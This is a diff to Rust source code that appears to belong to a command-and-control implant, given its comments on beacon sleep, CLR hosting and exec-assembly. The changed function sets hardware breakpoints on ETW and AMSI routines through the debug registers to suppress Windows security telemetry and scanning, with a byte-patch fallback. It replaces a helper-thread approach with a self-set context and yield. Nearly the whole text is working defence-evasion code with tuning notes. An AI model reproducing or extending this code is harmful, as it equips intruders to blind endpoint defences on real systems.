@@ -185,11 +185,17 @@ fn build() -> Result<Armed, String> {
 
 impl Armed {
     /// Writes DR0/DR1/DR7 on the calling (main) thread and verifies by
-    /// readback. SetThreadContext on a running thread (self included) is
-    /// documented as undefined behavior, so the write happens from a
-    /// helper thread that suspends the caller, sets, reads back and
-    /// resumes. The helper exists only inside this call and exits before
-    /// the next beacon sleep — the single-thread execution model survives.
+    /// readback. The write is a self-set on the pseudo current-thread
+    /// handle followed by a yield: x64 debug-register context is applied
+    /// lazily at the next switch-in of the thread, so a brief
+    /// `SwitchToThread` forces the application before the readback.
+    ///
+    /// A suspend/set/resume helper thread was tried first and REJECTED:
+    /// suspending the thread that is about to host the CLR leaves the
+    /// subsequent `CorBindToRuntimeEx` failing with 0x80004005 (found by
+    /// the exec-assembly test during the bench rerun — bisected to the
+    /// helper alone, with every other piece gated off). No second thread
+    /// exists anymore: the single-thread execution model holds.
     fn arm_breakpoints(&self) -> Result<(), String> {
         let resolve = |module: &str, name: &str| -> Result<usize, String> {
             unsafe { syscalls::export_address(module, name) }
@@ -207,71 +213,34 @@ impl Armed {
         put(CTX_DR1, self.amsi as u64);
         put(CTX_DR7, DR7_TWO_EXECUTE);
 
-        let get_tid: unsafe extern "system" fn() -> u32 =
-            unsafe { std::mem::transmute(resolve("kernel32.dll", "GetCurrentThreadId")?) };
-        let open_thread: unsafe extern "system" fn(u32, i32, u32) -> usize =
-            unsafe { std::mem::transmute(resolve("kernel32.dll", "OpenThread")?) };
-        let suspend_thread: unsafe extern "system" fn(usize) -> u32 =
-            unsafe { std::mem::transmute(resolve("kernel32.dll", "SuspendThread")?) };
-        let resume_thread: unsafe extern "system" fn(usize) -> u32 =
-            unsafe { std::mem::transmute(resolve("kernel32.dll", "ResumeThread")?) };
-        let close_handle: unsafe extern "system" fn(usize) -> i32 =
-            unsafe { std::mem::transmute(resolve("kernel32.dll", "CloseHandle")?) };
         let set_ctx: unsafe extern "system" fn(usize, *const CtxBuf) -> i32 =
             unsafe { std::mem::transmute(resolve("kernel32.dll", "SetThreadContext")?) };
         let get_ctx: unsafe extern "system" fn(usize, *mut CtxBuf) -> i32 =
             unsafe { std::mem::transmute(resolve("kernel32.dll", "GetThreadContext")?) };
+        let switch_to_thread: unsafe extern "system" fn() -> i32 =
+            unsafe { std::mem::transmute(resolve("kernel32.dll", "SwitchToThread")?) };
 
-        let tid = unsafe { get_tid() };
-        let (result, diag) = std::thread::scope(|scope| {
-            scope
-                .spawn(move || -> (Result<(), String>, String) {
-                    let mut diag = String::new();
-                    // THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME
-                    // (the readback needs GET_CONTEXT — without it the
-                    // check reads access-denied as "did not apply").
-                    let handle = unsafe { open_thread(0x0010 | 0x0008 | 0x0002, 0, tid) };
-                    if handle == 0 {
-                        return (Err("OpenThread(self) failed".into()), diag);
-                    }
-                    let _suspend_count = unsafe { suspend_thread(handle) };
-                    let ok = unsafe { set_ctx(handle, &ctx) };
-                    let _resumed = unsafe { resume_thread(handle) };
-                    let mut check = CtxBuf([0u8; 0x410]);
-                    check.0[CTX_FLAGS..CTX_FLAGS + 8]
-                        .copy_from_slice(&CONTEXT_DEBUG_REGISTERS.to_le_bytes());
-                    let got = unsafe { get_ctx(handle, &mut check) };
-                    let dr0 = u64::from_le_bytes(check.0[CTX_DR0..CTX_DR0 + 8].try_into().unwrap());
-                    diag.push_str(&format!(
-                        "set={ok} get={got} dr0={dr0:#x} (want {:#x})",
-                        self.etw
-                    ));
-                    unsafe { close_handle(handle) };
-                    if ok == 0 {
-                        return (Err("SetThreadContext failed".into()), diag);
-                    }
-                    if got == 0 {
-                        return (Err("GetThreadContext readback failed".into()), diag);
-                    }
-                    // Gate: on builds where the hypervisor owns the debug
-                    // registers the set succeeds but DR0 reads back zero.
-                    // Treat that as "cannot arm" so the caller falls back
-                    // to the byte patch (verified on Windows 11 26200,
-                    // HypervisorPresent, with and without VBS running).
-                    if dr0 != self.etw as u64 {
-                        return (
-                            Err("debug registers did not apply (VBS/hypervisor owns them)".into()),
-                            diag,
-                        );
-                    }
-                    (Ok(()), diag)
-                })
-                .join()
-                .map_err(|_| ("arm helper panicked".to_string(), String::new()))
-                .unwrap()
-        });
-        let _ = diag;
-        result
+        // Current-thread pseudo-handle (-2): no OpenThread, no suspend.
+        let self_thread: usize = -2isize as usize;
+        if unsafe { set_ctx(self_thread, &ctx) } == 0 {
+            return Err("SetThreadContext failed".into());
+        }
+        // Force the lazy application (a switch-in) before reading back.
+        unsafe { switch_to_thread() };
+        let mut check = CtxBuf([0u8; 0x410]);
+        check.0[CTX_FLAGS..CTX_FLAGS + 8].copy_from_slice(&CONTEXT_DEBUG_REGISTERS.to_le_bytes());
+        if unsafe { get_ctx(self_thread, &mut check) } == 0 {
+            return Err("GetThreadContext readback failed".into());
+        }
+        let dr0 = u64::from_le_bytes(check.0[CTX_DR0..CTX_DR0 + 8].try_into().unwrap());
+        // Gate: on builds where the hypervisor owns the debug registers
+        // the set succeeds but DR0 reads back zero. Treat that as "cannot
+        // arm" so the caller falls back to the byte patch (verified on
+        // Windows 11 26200, HypervisorPresent, with and without VBS).
+        if dr0 != self.etw as u64 {
+            return Err("debug registers did not apply (VBS/hypervisor owns them)".into());
+        }
+        Ok(())
     }
 }
 
